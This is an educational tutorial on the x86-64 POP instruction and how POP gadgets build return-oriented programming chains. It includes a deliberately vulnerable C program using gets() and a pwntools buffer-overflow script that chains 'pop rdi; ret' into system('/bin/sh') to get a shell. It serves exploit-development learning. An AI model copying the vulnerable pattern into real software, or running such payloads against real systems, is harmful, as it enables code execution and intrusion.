# Understanding POP in Assembly and ROP

## 🔧 What is POP?

`POP` is an assembly instruction that **removes data from the top of the stack** and **puts it into a register**. Think of the stack like a stack of plates - you can only take the top plate off.

## 📚 Stack Basics First

The stack grows **downward** in memory (from high addresses to low addresses):

```
High Memory Address
┌─────────────────┐
│     ...         │
├─────────────────┤
│   0x41414141    │ ← Stack Top (RSP points here)
├─────────────────┤
│   0x42424242    │
├─────────────────┤
│   0x43434343    │
├─────────────────┤
│     ...         │
└─────────────────┘
Low Memory Address
```

- **RSP** (Stack Pointer) always points to the **top** of the stack
- **PUSH** adds data to the top (decreases RSP)
- **POP** removes data from the top (increases RSP)

## 🎯 How POP Works

### Example 1: Basic POP Operation

**Before POP:**
```
RSP points to: 0x7fff12345678
Stack:
┌─────────────────┐
│   0x41414141    │ ← RSP points here
├─────────────────┤
│   0x42424242    │
├─────────────────┤
│   0x43434343    │
└─────────────────┘

RAX register: 0x0000000000000000
```

**Assembly Instruction:**
```assembly
pop rax
```

**After POP:**
```
RSP points to: 0x7fff12345680 (moved down by 8 bytes)
Stack:
┌─────────────────┐
│   0x42424242    │ ← RSP now points here
├─────────────────┤
│   0x43434343    │
└─────────────────┘

RAX register: 0x0000000041414141 (value that was popped)
```

## 💡 Step-by-Step Breakdown

1. **POP reads** the value at the memory address RSP points to
2. **POP stores** that value in the specified register
3. **POP increases** RSP by the size of the data (8 bytes on x64, 4 bytes on x86)

## 🔍 Common POP Instructions

```assembly
pop rax     ; Pop 8 bytes into RAX register
pop rbx     ; Pop 8 bytes into RBX register  
pop rcx     ; Pop 8 bytes into RCX register
pop rdi     ; Pop 8 bytes into RDI register (1st function argument)
pop rsi     ; Pop 8 bytes into RSI register (2nd function argument)
pop rdx     ; Pop 8 bytes into RDX register (3rd function argument)
```

## 🎪 Complete Example with Code

Let's trace through a simple program:

```c
// simple.c
#include <stdio.h>

void vulnerable_function() {
    char buffer[64];
    gets(buffer);  // Vulnerable function
}

int main() {
    vulnerable_function();
    return 0;
}
```

**Compiled Assembly (simplified):**
```assembly
vulnerable_function:
    push   rbp           ; Save old frame pointer
    mov    rbp, rsp      ; Set up new frame
    sub    rsp, 0x50     ; Allocate 80 bytes for buffer
    
    lea    rax, [rbp-0x50]  ; Load buffer address
    mov    rdi, rax         ; Put buffer address in 1st argument
    call   gets             ; Call gets(buffer)
    
    leave                   ; Clean up stack frame
    ret                     ; Return (pops return address and jumps)

main:
    call   vulnerable_function
    mov    eax, 0
    ret
```

## 🚀 Why POP is Critical for ROP

In ROP, we chain together small pieces of code called "gadgets" that end with `ret`. Here's why POP is so important:

### ROP Gadget Example

```assembly
; This is a useful ROP gadget
pop rdi        ; Pop value from stack into RDI (1st function argument)
ret            ; Return to next address on stack
```

### How We Use This Gadget

**Our ROP Chain on Stack:**
```
┌─────────────────┐
│  gadget_addr    │ ← Return address (points to "pop rdi; ret")
├─────────────────┤
│  "/bin/sh"      │ ← Value we want in RDI
├─────────────────┤
│  system_addr    │ ← Address of system() function
└─────────────────┘
```

**Execution Flow:**
1. **ret** instruction jumps to `gadget_addr`
2. **pop rdi** takes "/bin/sh" from stack and puts it in RDI
3. **ret** jumps to `system_addr`
4. **system()** gets called with "/bin/sh" as first argument
5. **Result:** `system("/bin/sh")` executes!

## 🎯 Practical ROP Example

Let's build a simple ROP chain:

```python
from pwn import *

# Addresses we found through analysis
pop_rdi_ret = 0x401234      # Address of "pop rdi; ret" gadget
system_addr = 0x7f1234567890 # Address of system() function
bin_sh_addr = 0x7f1234567abc # Address of "/bin/sh" string

# Our buffer overflow payload
payload = b'A' * 72          # Overflow buffer to reach return address

# ROP chain
payload += p64(pop_rdi_ret)  # 1. Jump to "pop rdi; ret"
payload += p64(bin_sh_addr)  # 2. This gets popped into RDI
payload += p64(system_addr)  # 3. Jump to system() with "/bin/sh" in RDI

# Send payload
p = process('./vulnerable_program')
p.sendline(payload)
p.interactive()  # Get shell!
```

## 🔄 Multiple POP Gadgets

Sometimes you need to set multiple registers:

```assembly
; Multi-pop gadget
pop rdi        ; Pop 1st value into RDI (1st argument)
pop rsi        ; Pop 2nd value into RSI (2nd argument)  
pop rdx        ; Pop 3rd value into RDX (3rd argument)
ret            ; Return to next address
```

**Stack Layout:**
```
┌─────────────────┐
│  gadget_addr    │ ← Return address
├─────────────────┤
│  value_for_rdi  │ ← Gets popped into RDI
├─────────────────┤
│  value_for_rsi  │ ← Gets popped into RSI
├─────────────────┤
│  value_for_rdx  │ ← Gets popped into RDX
├─────────────────┤
│  next_function  │ ← Where to jump after setting up arguments
└─────────────────┘
```

## 🛠️ Finding POP Gadgets

Use tools like ROPgadget or ropper:

```bash
# Find all pop gadgets
ROPgadget --binary ./program --only "pop"

# Find specific gadgets
ROPgadget --binary ./program --grep "pop rdi"

# Using ropper
ropper --file ./program --search "pop rdi"
```

**Example Output:**
```
0x0000000000401234 : pop rdi ; ret
0x0000000000401235 : pop rsi ; ret  
0x0000000000401236 : pop rdx ; ret
0x0000000000401237 : pop rdi ; pop rsi ; ret
```

## 🎪 Key Takeaways

1. **POP removes data from stack top** and puts it in a register
2. **Stack pointer (RSP) moves** after each POP operation
3. **In ROP, POP gadgets let us control register values** by placing data on the stack
4. **The order matters** - data gets popped in the order it appears on the stack
5. **Each POP moves RSP** by 8 bytes (on x64) to the next stack item

## 🚨 Common Beginner Mistakes

❌ **Wrong:** Thinking POP pushes data TO the stack
✅ **Correct:** POP removes data FROM the stack

❌ **Wrong:** Not accounting for stack pointer movement
✅ **Correct:** Remember RSP moves after each POP

❌ **Wrong:** Wrong order of values in ROP chain
✅ **Correct:** Values are popped in the order they appear on stack

Think of POP as "taking the top item off a stack of papers and writing it on a whiteboard (register)". The stack gets shorter, and the register gets the value!

Ref: <br>
https://ropemporium.com/guide.html <br>
https://www.ired.team/offensive-security/code-injection-process-injection/binary-exploitation/rop-chaining-return-oriented-programming <br>
https://ir0nstone.gitbook.io/notes/binexp/stack/return-oriented-programming <br>
https://ctf101.org/binary-exploitation/return-oriented-programming/ <br>
